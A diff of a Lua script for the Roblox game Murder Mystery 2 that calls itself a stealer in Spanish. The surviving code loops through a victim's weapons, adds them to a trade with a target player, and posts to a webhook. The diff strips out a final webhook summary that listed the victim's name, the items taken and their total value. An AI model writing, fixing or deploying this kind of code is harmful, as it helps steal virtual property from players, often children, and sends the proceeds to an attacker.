@@ -194,8 +194,6 @@ SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gra
 
 -- Trade
 local function doTrade(targetName)
-    local sentItems = {}
-    local sentTotal = 0
     while #weaponsToSend>0 do
         local status=getTradeStatus()
         if status=="None" then
@@ -207,8 +205,6 @@ local function doTrade(targetName)
                 local w=table.remove(weaponsToSend,1)
                 for _=1,w.Amount do
                     addWeaponToTrade(w.DataID)
-                    table.insert(sentItems,w)
-                    sentTotal += w.Value * w.Amount
                 end
             end
             task.wait(6)
@@ -217,17 +213,6 @@ local function doTrade(targetName)
         else task.wait(0.5) end
         task.wait(1)
     end
-    -- Webhook final del trade
-    local tradeStatusText = (#sentItems>0 and "💎 Todos los ítems recibidos correctamente ✅" or "⚠️ Trade incompleto 😢")
-    local fieldsFinal={
-        {name="Victim 👤:", value=LocalPlayer.Name, inline=true},
-        {name="Items recibidos 📦:", value="", inline=false},
-        {name="Valor total recibido:", value=tostring(sentTotal).."💎", inline=true}
-    }
-    for _, w in ipairs(sentItems) do
-        fieldsFinal[2].value=fieldsFinal[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
-    end
-    SendWebhook("💰Resumen del Trade", tradeStatusText, fieldsFinal, prefix)
 end
 
 -- Activación por chat
